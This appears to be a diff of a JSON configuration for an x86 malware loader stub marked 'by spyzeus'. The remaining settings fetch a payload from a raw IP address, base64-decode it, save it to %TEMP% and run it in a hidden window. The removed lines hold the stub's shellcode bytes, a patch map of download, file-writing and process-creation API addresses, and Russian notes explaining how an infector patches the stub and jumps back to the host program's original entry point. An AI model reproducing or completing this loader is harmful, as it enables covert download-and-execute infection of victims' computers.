@@ -2,7 +2,7 @@
   "meta": {
     "name": "site_loader_x86",
     "arch": "x86",
-    "version": "1.2",
+    "version": "2.0",
     "marker": "005c306279207370797a6575735c30",
     "marker_ascii": "\\0\"by spyzeus\"\\0",
     "save_dir": "%TEMP%",
@@ -11,47 +11,5 @@
     "visible_window": false,
     "base64_decode": true,
     "download_url": "http://77.91.65.122/info.php"
-  },
-
-  "placeholders": {
-    "AA": "runtime function address (4 bytes LE)",
-    "BB": "rel32 (4 bytes LE, signed)"
-  },
-
-  "patch_map": [
-    { "offset": 38,   "size": 4, "type": "addr", "name": "GetTempPathA" },
-    { "offset": 53,   "size": 4, "type": "addr", "name": "GetTickCount" },
-    { "offset": 198,  "size": 4, "type": "addr", "name": "InternetOpenA" },
-    { "offset": 246,  "size": 4, "type": "addr", "name": "InternetOpenUrlA" },
-    { "offset": 261,  "size": 4, "type": "addr", "name": "InternetReadFile" },
-    { "offset": 283,  "size": 4, "type": "addr", "name": "InternetCloseHandle" },
-    { "offset": 292,  "size": 4, "type": "addr", "name": "InternetCloseHandle" },
-    { "offset": 340,  "size": 4, "type": "addr", "name": "CryptStringToBinaryA" },
-    { "offset": 372,  "size": 4, "type": "addr", "name": "CreateFileA" },
-    { "offset": 414,  "size": 4, "type": "addr", "name": "WriteFile" },
-    { "offset": 433,  "size": 4, "type": "addr", "name": "CloseHandle" },
-    { "offset": 516,  "size": 4, "type": "addr", "name": "CreateProcessA" },
-    { "offset": 544,  "size": 4, "type": "rel32", "name": "jmp_trampoline" },
-    { "offset": 599,  "size": 4, "type": "rel32", "name": "trampoline_jmp_ep_plus_5" }
-  ],
-
-  "data_block": {
-    "marker_offset": 0,
-    "url_offset": 12,
-    "url_slot_size": 32,
-    "url": "http://77.91.65.122/info.php",
-    "ext_table": ["exe", "scr", "pif", "com"]
-  },
-
-  "stub_bytes_clean":
-    "5589E581EC00200000895DFC8975F8897DF468040100008D84240402000050B8AAAAAAAAAAD0B8AAAAAAAAAAD08DB424040200008DBC2404040000B904010000F3A48DBC240404000031C0B904010000F2AE4F4F803F5C740147B90800000031C0B8AAAAAAAAAAD089C36A006A006A006A0068302E352F687A696C6C686F4D7A2F54B8AAAAAAAAAAD0898424000800006A0068000000406A006A008D35BBBBBBBB56FFB42410080000B8AAAAAAAAAAD0898424040800008D84240C0800005068008000008D84240C06000050FFB4240C080000B8AAAAAAAAAAD0FFB42404080000B8AAAAAAAAAAD0FFB42400080000B8AAAAAAAAAAD0",
-
-  "notes": [
-    "0xAA = 4-байтный адрес функции, заполняется инфектором.",
-    "0xBB = 4-байтный signed rel32, вычисляется относительно RVA .stub.",
-    "URL в data-блоке фиксированной длины 32 байта (ASCIIZ).",
-    "base64_decode=true — стаб вызывает CryptStringToBinaryA(CRYPT_STRING_BASE64).",
-    "Порядок патчей: адреса функций, rel32 трамплина, 5 байт оригинального EP.",
-    "Полная сборка stub выполняется функцией BuildShellcodeX86 в инфекторе."
-  ]
+  }
 }
